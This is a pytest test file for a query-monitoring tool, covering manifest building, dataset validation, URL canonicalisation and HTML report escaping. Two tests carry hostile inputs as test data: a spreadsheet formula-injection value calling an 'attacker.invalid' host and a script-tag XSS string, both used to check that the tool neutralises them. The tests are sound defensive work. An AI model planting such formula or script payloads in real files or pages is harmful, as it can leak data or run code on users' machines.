import csv
import json

import pytest

import geo_monitor.dashboard as dashboard_module
from geo_monitor.adapters import build_sampling_profile, get_adapter
from geo_monitor.config import Settings
from geo_monitor.dashboard import DashboardError, build_dashboard
from geo_monitor.dataset import DatasetError, load_queries
from geo_monitor.fanout import FanoutError, build_query_manifest
from geo_monitor.renderers import render_html
from geo_monitor.report_model import ReportModel, ReportSection, paragraph
from geo_monitor.response_parser import parse_response


def _write_seed(path, *, seed_query="recommend one", persona="comparison_shopper"):
    path.write_text(
        "\n".join(
            [
                "seeds:",
                "  - seed_id: sample",
                f"    seed_query: {json.dumps(seed_query, ensure_ascii=False)}",
                "    personas:",
                f"      - {persona}",
            ]
        ),
        encoding="utf-8",
    )


@pytest.mark.parametrize("tags", [123, {"bad": "shape"}, ["ok", 2]])
def test_jsonl_invalid_tags_are_reported_as_dataset_errors(tmp_path, tags):
    path = tmp_path / "queries.jsonl"
    path.write_text(
        json.dumps({"query_id": "q1", "query": "hello", "tags": tags}, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )

    with pytest.raises(DatasetError, match=r"JSONL 第 1 行字段错误.*tags"):
        load_queries(path)


def test_fanout_formula_cells_are_safe_on_disk_and_decode_for_model_input(tmp_path):
    seed = tmp_path / "seed.yaml"
    manifest = tmp_path / "query_manifest.csv"
    _write_seed(seed, seed_query='=WEBSERVICE("https://attacker.invalid")')

    build_query_manifest(seed, manifest)

    with manifest.open("r", encoding="utf-8", newline="") as f:
        stored = next(csv.DictReader(f))
    assert stored["seed_query"].startswith("'=")
    assert stored["query"].startswith("'=")

    record = load_queries(manifest)[0]
    expected = '=WEBSERVICE("https://attacker.invalid")，请对比几个主流选择'
    assert record.query == expected
    settings = Settings(llm_api_key=None)
    adapter = get_adapter("openai_responses_web_search")
    profile = build_sampling_profile(adapter_name=adapter.name, model="test-model", settings=settings)
    request = adapter.build_request(record, profile, settings, {})
    assert request.payload["input"] == expected


def test_manifest_csv_encoding_preserves_a_literal_leading_apostrophe(tmp_path):
    seed = tmp_path / "seed.yaml"
    manifest = tmp_path / "query_manifest.csv"
    _write_seed(seed, seed_query="'=literal text")

    build_query_manifest(seed, manifest)

    with manifest.open("r", encoding="utf-8", newline="") as f:
        stored = next(csv.DictReader(f))
    assert stored["query"].startswith("''=literal")
    assert load_queries(manifest)[0].query == "'=literal text，请对比几个主流选择"


def test_unknown_builtin_persona_fails_closed(tmp_path):
    seed = tmp_path / "seed.yaml"
    manifest = tmp_path / "query_manifest.csv"
    _write_seed(seed, persona="beginnner")

    with pytest.raises(FanoutError, match="未知内置 persona.*beginnner"):
        build_query_manifest(seed, manifest)
    assert not manifest.exists()


def test_fanout_force_preserves_existing_manifest_when_write_fails(tmp_path, monkeypatch):
    seed = tmp_path / "seed.yaml"
    manifest = tmp_path / "query_manifest.csv"
    _write_seed(seed)
    build_query_manifest(seed, manifest)
    original = manifest.read_bytes()

    def fail_writerows(self, rows):
        raise OSError("simulated disk failure")

    monkeypatch.setattr(csv.DictWriter, "writerows", fail_writerows)
    with pytest.raises(OSError, match="simulated disk failure"):
        build_query_manifest(seed, manifest, force=True)

    assert manifest.read_bytes() == original
    assert list(tmp_path.glob(f".{manifest.name}.*.tmp")) == []


def test_source_urls_are_canonicalized_and_tracking_variants_deduplicated():
    first = "HTTPS://user:secret@WWW.Example.COM:443/a?utm_source=x&b=2&a=1#section"
    second = "https://www.example.com/a?a=1&utm_medium=email&b=2"
    payload = {
        "output_text": "answer",
        "output": [
            {"type": "url_citation", "title": "First", "url": first},
            {"type": "url_citation", "title": "Second", "url": second},
        ],
    }

    _, sources, _, _ = parse_response(payload)

    assert len(sources) == 1
    assert sources[0].url == "https://www.example.com/a?a=1&b=2"
    assert sources[0].domain == "example.com"
    assert sources[0].raw["url"] == first


def test_html_renderer_escapes_report_model_text_once():
    model = ReportModel(
        title="Report",
        job_id="j1",
        generated_at="2026-01-01T00:00:00Z",
        sample_mode="live",
        conclusion_strength="strong",
        sections=(ReportSection(key="summary", title="Summary", blocks=(paragraph("<script>alert('x')</script> & copy"),)),),
    )

    rendered = render_html(model)

    assert "<script>" not in rendered
    assert "&amp;lt;script&amp;gt;" not in rendered
    assert "&lt;script&gt;alert(&#x27;x&#x27;)&lt;/script&gt; &amp; copy" in rendered


def test_dashboard_missing_db_does_not_create_output_directory(tmp_path):
    out = tmp_path / "nested" / "dashboard"

    with pytest.raises(DashboardError, match="DuckDB 不存在"):
        build_dashboard(tmp_path / "missing.duckdb", out)

    assert not out.exists()
    assert not out.parent.exists()


def test_dashboard_render_failure_removes_new_empty_output_directory(tmp_path, monkeypatch):
    out = tmp_path / "dashboard"
    monkeypatch.setattr(dashboard_module, "_load_dashboard_data", lambda db: {})

    def fail_render(data):
        raise RuntimeError("render failed")

    monkeypatch.setattr(dashboard_module, "_render_html", fail_render)
    with pytest.raises(RuntimeError, match="render failed"):
        build_dashboard(tmp_path / "unused.duckdb", out)

    assert not out.exists()
